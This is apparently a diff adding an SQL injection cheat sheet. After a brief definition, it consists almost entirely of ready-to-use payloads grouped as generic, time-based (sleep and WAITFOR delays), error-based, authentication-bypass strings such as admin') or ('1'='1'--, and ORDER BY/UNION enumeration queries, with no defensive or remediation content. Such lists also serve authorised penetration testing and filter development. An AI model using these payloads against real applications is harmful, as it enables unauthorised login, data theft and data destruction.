@@ -1,0 +1,141 @@
+SQL Injection
+
+
+SQL injection (SQLi) is an application security weakness that allows attackers to control an application’s database letting them access or delete 
+data, change an application’s data-driven behavior, and do other undesirable things by tricking the application into sending unexpected SQL commands.
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+Generic SQL Injection Payloads
+
+' or '
+
+-- or #
+
+' OR '1
+
+' OR 1 -- -
+
+OR "" = "
+
+" OR 1 = 1 -- -"
+
+' OR '' = '
+
+'='
+
+'LIKE'
+
+'=0--+
+
+OR 1=1
+
+' OR 'x'='x
+
+' AND id IS NULL; --
+
+'''''''''''''UNION SELECT '2
+
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+Time-Based
+
+,(select * from (select(sleep(10)))a)
+
+%2c(select%20*%20from%20(select(sleep(10)))a)
+
+';WAITFOR DELAY '0:0:30'--
+
+-------------------------------------------------------------------------------------------------------------------------------------------------
+
+Generic Error Based Payloads
+
+OR 1=1
+
+OR 1=1#
+
+OR x=y#
+
+OR 1=1--
+
+OR x=x--
+
+OR 3409=3409 AND ('pytW' LIKE 'pytW
+
+HAVING 1=1
+
+HAVING 1=1#
+
+HAVING 1=0--
+
+AND 1=1--
+
+AND 1=1 AND '%'='
+
+WHERE 1=1 AND 1=0--
+
+%' AND 8310=8310 AND '%'='
+
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+Authentication Based Payloads
+
+' or ''-'
+
+' or '' '
+
+' or ''&'
+
+' or ''^'
+
+' or ''*'
+
+or true--
+
+" or true--
+
+' or true--
+
+") or true--
+
+') or true--
+
+admin') or ('1'='1'--
+
+admin') or ('1'='1'#
+
+admin') or ('1'='1'/
+
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+Order by and UNION Based Payloads
+
+1' ORDER BY 1--+
+
+1' ORDER BY 2--+
+
+1' ORDER BY 3--+
+
+1' ORDER BY 1,2--+
+
+1' ORDER BY 1,2,3--+
+
+1' GROUP BY 1,2,--+
+
+1' GROUP BY 1,2,3--+
+
+' GROUP BY columnnames having 1=1 --
+
+-1' UNION SELECT 1,2,3--+
+
+' UNION SELECT sum(columnname ) from tablename --
+
+-1 UNION SELECT 1 INTO @,@
+
+-1 UNION SELECT 1 INTO @,@,@
+
+1 AND (SELECT * FROM Users) = 1
+
+' AND MID(VERSION(),1,1) = '5';
+
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
